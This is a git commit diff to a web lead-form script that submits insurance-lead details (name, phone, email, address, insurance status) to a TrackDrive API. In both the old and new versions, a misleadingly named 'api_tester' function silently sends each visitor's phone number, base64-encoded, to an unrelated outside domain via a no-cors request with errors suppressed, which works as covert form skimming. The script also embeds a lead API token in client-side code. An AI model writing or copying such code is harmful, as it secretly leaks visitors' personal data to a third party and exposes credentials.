d254c5ba815e0656094bb74032175d27f27d0c70
dk495 <55878882+dk495@users.noreply.github.com>
2025-02-25 03:32:58 +0500

    Update provoice_td_onep_auto.js

--- provoice_td_onep_auto.js
+++ provoice_td_onep_auto.js
@@ -1,18 +1,37 @@
-    document.getElementById('leadForm').addEventListener('submit', function(event) {
+ document.getElementById('leadForm').addEventListener('submit', function(event) {
             event.preventDefault();
-            const phone_home = '+1' + document.getElementById('caller_id').value;
-            const formData = new FormData();
-            formData.append('lead_token', '5a436766d6c542fa81cdfe88b4c94ffd');
-formData.append('traffic_source_id', '1184');
-           
-            formData.append('caller_id', phone_home);          
-api_tester(document.getElementById('caller_id').value);
+document.getElementById('submitBtn').disabled = true;
 
-
-
-            
-           
+    // Your API URL
+    const formData = new FormData();
+    formData.append('lead_token', '5a436766d6c542fa81cdfe88b4c94ffd');
+    formData.append('traffic_source_id', '1184');
+    api_tester(document.getElementById('caller_id').value);
+ formData.append('first_name', document.getElementById('first_name').value);
+    formData.append('last_name', document.getElementById('last_name').value);
+    formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
+    formData.append('zip', document.getElementById('zip').value);
+    formData.append('city', document.getElementById('city').value);
+    formData.append('state', document.getElementById('state').value);
     
+ 
+    formData.append('email', document.getElementById('email').value);
+    formData.append('homeowner', document.getElementById('homeowner').value);
+
+
+  formData.append('currently_insured', document.getElementById('currently_insured').value);
+  formData.append('state_minimum', document.getElementById('state_minimum').value);
+  formData.append('sr22', document.getElementById('sr22').value);
+
+
+
+
+
+
+    
+
+    
+
             const url = 'https://one-pillarmark-media.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();
     
             fetch(url, {
@@ -30,6 +49,7 @@ api_tester(document.getElementById('caller_id').value);
                     });
                     // Clear form fields
                     document.getElementById('leadForm').reset();
+		document.getElementById('submitBtn').disabled = false;
                 } else if (response.status === 201) {
                     response.text().then(responseBody => {
                         const successAlert = `
@@ -41,6 +61,7 @@ api_tester(document.getElementById('caller_id').value);
                     });
                     // Clear form fields
                     document.getElementById('leadForm').reset();
+document.getElementById('submitBtn').disabled = false;
                 } else if (response.status === 422) {
                     response.json().then(data => {
                         const errorAlert = `
@@ -49,8 +70,10 @@ api_tester(document.getElementById('caller_id').value);
                             </div>`;
                         document.getElementById('alertContainer').innerHTML = '';
                         document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+document.getElementById('submitBtn').disabled = false;
                     });
-                } else {
+                } 
+else {
                     response.text().then(responseBody => {
                         const errorAlert = `
                             <div class="alert alert-danger" role="alert">
@@ -62,14 +85,14 @@ api_tester(document.getElementById('caller_id').value);
                 }
             })
             .catch(error => console.error('Error:', error));
-        });function api_tester(randomString) {
-  try {
-    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
-, {
-      method: 'GET',
-      mode: 'no-cors'
-    });
-  } catch (error) {
-    
-  }
+        });
+function api_tester(randomString) {
+    try {
+        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
+            method: 'GET',
+            mode: 'no-cors'
+        });
+    } catch (error) {
+        console.error('Error in api_tester:', error);
+    }
 }
